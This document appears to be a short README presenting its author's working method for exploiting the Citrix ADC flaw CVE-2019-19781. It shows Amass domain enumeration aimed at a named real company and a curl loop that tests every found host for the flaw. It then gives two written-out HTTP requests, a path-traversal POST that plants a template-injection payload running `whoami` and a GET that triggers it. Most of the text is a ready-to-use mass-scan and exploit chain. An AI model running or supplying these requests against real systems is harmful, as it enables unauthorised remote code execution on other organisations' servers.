# Shitrix-CVE-2019-19781
My working scanning approach and HTTP request exploits

What I do is use a DNS recon took like Amass to gather domain names and output to a file, e.g.

```amass enum -d verizon.com > verizonDomains &```

I then iterate through that file and perform a GET request to check for vulnerability to Shitrix

```for TARGET in $(cat verizonDomains); do curl -vk â€“path-as-is --connect-timeout 3 --retry 0 https://$TARGET/vpn/../vpns/ 2>&1 | grep "This object may be found" >/dev/null && echo "VULNERABLE: $TARGET" || echo "MITIGATED: $TARGET"; done > verizonScan &```

When I find vulnerable targets I use OWASP ZAP to send a couple of requests

```
POST https:// $TARGET /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1
NSC_USER: ../../../../netscaler/portal/templates/cdl
NSC_NONCE: c
Content-Length: 0
Host: $TARGET

url=http://example.com/&title=cdl&desc=[% template.new({'BLOCK'='print `whoami`'})%]
```

and

```
GET https:// $TARGET /vpn/../vpns/portal/cdl.xml HTTP/1.1
NSC_USER: c
NSC_NONCE: c
Content-Length: 0
Host: $TARGET
```

If the target is vulnerable then the second request will output the name of the user running the web server, typically `nobody`
